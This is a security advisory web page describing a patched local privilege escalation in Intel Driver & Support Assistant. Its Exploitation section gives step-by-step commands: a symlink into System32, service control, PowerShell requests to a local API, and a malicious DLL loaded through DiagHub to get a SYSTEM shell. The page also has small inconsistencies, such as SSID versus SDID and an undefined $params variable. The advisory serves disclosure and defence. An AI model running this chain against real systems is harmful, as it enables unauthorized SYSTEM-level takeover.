<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Intel Driver &amp; Support Assistant (DSA) LPE</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/intel-driver-and-support-assistant-dsa-lpe/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/intel-driver-and-support-assistant-dsa-lpe/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/intel-driver-and-support-assistant-dsa-lpe/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Intel Driver &amp; Support Assistant (DSA) LPE</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Intel Driver &amp; Support Assistant (DSA) and Intel Computing Improvement Program</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2018-12148, CVE- 2018-12168</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>Local Privilege Escalation</td>
          </tr>
        </table>
        
        <h1>Description</h1><p>Intel Driver &amp; Support Assistant (DSA) is a Freeware application by Intel that checks for updates for Intel drivers and tools.</p><p>It contained a Local Privilege Escalation vulnerability that would allow a local attacker or malware to escalate their privileges from user to system. This vulnerability was patched in version 3.5.0.1</p><p>The same root cause was also identified in 'Intel Computing Improvement Program' for versions before 2.2.0.03942.</p><h1>Impact</h1><p>An attacker or malicious process could exploit this vulnerability locally to escalate their privileges to NT/SYSTEM. <br>The CVSS V3 Vector assigned to this vulnerability is <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H">AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</a> and a score of 7.8.</p><h1>Cause</h1><p>While the 'Intel(R) SUR QC SA' service is running it may create the file %ProgramData%\Intel\SharedData\SDID. This file is created by the NT/SYSTEM user and is created with the permissions granting all users full control of the file.</p><p style="text-align: center;"> <img class="leftAlone" title="" src="assets/Uploads/Image-1-SDID-permissions2.PNG" alt="Image 1 SDID permissions2" width="363" height="509"></p><p>A local attacker as any authenticated user can remove the SSID file and create a symlink allowing for arbitrary file creation (with any name) with System permissions while still allowing any user to modify the file once created. </p><h1>Solution</h1><p>This vulnerability was patched in <span> Intel(R) Driver and Support Assistant before 3.5.0.1 and <span>Intel(R) Computing Improvement Program before version 2.2.0.03942.</span></span></p><p>The solution in both cases prevents non administrators from writing to the file.</p><h1>Exploitation</h1><p>An arbitrary file creation and write primitive makes it trivial to gain code execution as system. One approach might be to replace the content of the file created by the Intel application with a malicious DLL and getting a system service/process to load that DLL. <br>The simplest way to load a DLL as system is to utilise a feature of the 'Microsoft (R) Diagnostics Hub Standard Collector Service' to load a malicious DLL from the system32 directory.</p><h2>Step 1: Remove the File</h2><p>Before we can create a symlink we need to remove the SSID file and anything else in the same folder.</p><p>rm "C:\ProgramData\Intel\SharedData\*"</p><h2>Step 2: Create Symlink</h2><p>Next we need to create a symlink.</p><p>To do this without administrator rights we first need to create a Mount Point such that 'C:\ProgramData\Intel\SharedData\' points to the "\RPC Control\" object directory. We then create a Symlink such that "\RPC Control\SSID" points to "\\?\C:\Windows\System32\evilDll.dlll"</p><p>To do this we can use James Forshaw's symboliclink-testing-tools (<a href="https://github.com/google/symboliclink-testing-tools">https://github.com/google/symboliclink-testing-tools</a>)</p><pre>CreateSymlink.exe C:\ProgramData\Intel\SharedData\SDID C:\Windows\System32\evilDll.dll</pre><h2>Step 3: Start Service</h2><p>The service that creates the file is not always running and thus we will need to start it. Thankfully this service can be started by any authenticated user:</p><pre>Start-Service -Name "Intel(R) SUR QC SAM"</pre><h2>Step 4: Trigger file creation</h2><p>The service does not automatically create the file, so we need to trigger the file creation. From reverse engineering the service we found the code that is responsible for the creation of the file and that it can be triggered using a couple of HTTP requests to a locally listening server.</p><pre>$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"<br>$headers.Add("Origin", "http://localhost")<br>$params1 = "0`r`n"<br>$params2 = '{"assetId": "ef1526ef-396a-4eb3-9869-79ec77c3715b","type": "WindowsApplication","name": "Intel(R) Computing Improvement Program", "custom_data": {"SURVersion": "2.1.03638"}}'<br>$port = Get-Content -Path "C:\ProgramData\Intel\SUR\QUEENCREEK\Updater\AppData\web_server_port.txt"<br>$uri1 = "http://127.0.0.1:$port/api/v2/api_lock"<br>$uri2 = "http://127.0.0.1:$port/api/v2/updates"<br>Invoke-WebRequest -Uri $uri1 -Method PUT -Body $params -ContentType "application/json" -Headers $headers<br>Invoke-WebRequest -Uri $uri2 -Method POST -Body $params2 -ContentType "application/json" -Headers $headers</pre><h2>Step 5: Stop Service</h2><p>Once the file has been created we need to stop service so it closes the file.</p><pre>Stop-Service -Name "Intel(R) SUR QC SAM"</pre><h2>Step 6: Replace file with evil DLL content</h2><p>The contents of the DLL can now be modified to contain malicious code that will be executed as System when it is loaded.</p><p>In this PoC we built a simple DLL that will spawn cmd.exe when loaded.</p><h2>Step 7: Load DLL</h2><p>For this PoC we decided to load the DLL using a nifty trick by getting the Windows Service ''<span>Microsoft (R) Diagnostics Hub Standard Collector Service" (<span>DiagHub</span>) to load it for us. The details of this technique can be found in a blog post by James Forshaw (</span><a href="https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html">https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html</a>).</p><p>Here we modified James' code to launch our evilDLL which results in a System shell being spawned.</p><p style="text-align: center;"><img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwzMTRd/Image-4-System-Shell.PNG" alt="Image 4 System Shell" width="600" height="314"></p><h1>Timeline</h1><p> </p><table><tbody><tr><td>Date</td>
<td>Summary</td>
</tr><tr><td>03/07/2018</td>
<td>Reported bug via hackerone and email to intel PSIRT</td>
</tr><tr><td>03/07/2018</td>
<td>Response saying they have passed the report to the aproprate application team</td>
</tr><tr><td>09/07/2018</td>
<td>Full working exploit provided via hackerone</td>
</tr><tr><td>13/07/2018</td>
<td>Emailed intel PSIRT with full details and working exploit</td>
</tr><tr><td>13/07/2018</td>
<td>Product team confirm vulnerabiltiy and that it affects multiple products</td>
</tr><tr><td>31/07/2018</td>
<td>CVE assigned</td>
</tr><tr><td>11/09/2018</td>
<td>Vulnerability patched and Intel Advisory issued</td>
</tr></tbody></table><h3>Further Information</h3><p><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00165.html">https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00165.html</a></p><p><a href="https://github.com/googleprojectzero/symboliclink-testing-tools">https://github.com/googleprojectzero/symboliclink-testing-tools</a></p><p> </p>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/intel-driver-and-support-assistant-dsa-lpe/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/intel-driver-and-support-assistant-dsa-lpe/&text=Intel Driver &amp; Support Assistant (DSA) LPE" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/intel-driver-and-support-assistant-dsa-lpe/&title=Intel Driver &amp; Support Assistant (DSA) LPE" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/intel-driver-and-support-assistant-dsa-lpe/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
